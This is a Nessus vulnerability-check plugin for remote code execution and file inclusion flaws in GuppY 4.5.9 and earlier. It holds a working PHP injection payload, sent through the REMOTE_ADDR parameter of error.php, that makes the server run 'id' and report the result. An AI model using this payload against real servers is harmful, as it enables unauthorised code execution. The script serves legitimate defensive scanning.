#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20248);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-3926", "CVE-2005-3927");
  script_bugtraq_id(15609, 15610);
  script_osvdb_id(21166, 21167, 21168, 21169, 21170);

  script_name(english:"GuppY <= 4.5.9 Multiple Remote Vulnerabilities (Traversal, Code Exec)");
  script_summary(english:"Checks for multiple vulnerabilities in GuppY <= 4.5.9");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GuppY, a content management system written
in PHP. 

The version of GuppY installed on the remote host does not sanitize
user input to the server variable 'REMOTE_ADDR' before using it in the
'error.php' script as part of an include script.  An unauthenticated
attacker can leverage this issue to run arbitrary code on the remote
host subject to the privileges of the web server user id. 

In addition, the application reportedly is prone to several local file
include and information disclosure vulnerabilities in scripts used for
administration." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/guppy459_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/417899" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/28");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/guppy", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to run a command.
  cmd = "id";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/error.php?",
      "err=", SCRIPT_NAME, "&",
      "_SERVER=&",
      '_SERVER[REMOTE_ADDR]=";system(', urlencode(str:cmd), ');exit(0);echo"'
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = strcat(w[0], w[1], '\r\n', w[2]);

  # Follow the redirect, if it's available.
  url = strstr(res, "location: ");
  if (url) {
    url = url - "location: ";
    url = url - strstr(url, SCRIPT_NAME);
    url += SCRIPT_NAME;
  }
  if (url) {
    w = http_send_recv3(method:"GET", item:string(dir, "/", url), port:port);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if we could run the command.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
      contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");
      if (!strlen(contents)) contents = res;

      report = string(
        "\n",
        "It was possible to execute the command '", cmd, "' on the remote host,\n",
        "which produces :\n",
        "\n",
        "  ", contents
      );

      security_hole(port:port, extra:report);
      exit(0);
    }

    # If we see something like our exploit, PHP's magic quotes is enabled; 
    # other flaws are possible though so report a flaw.
    if (egrep(pattern:'IP address : ";system\\(.+\\);echo"', string:res)) {
      security_hole(port);
      exit(0);
    }
  }
}
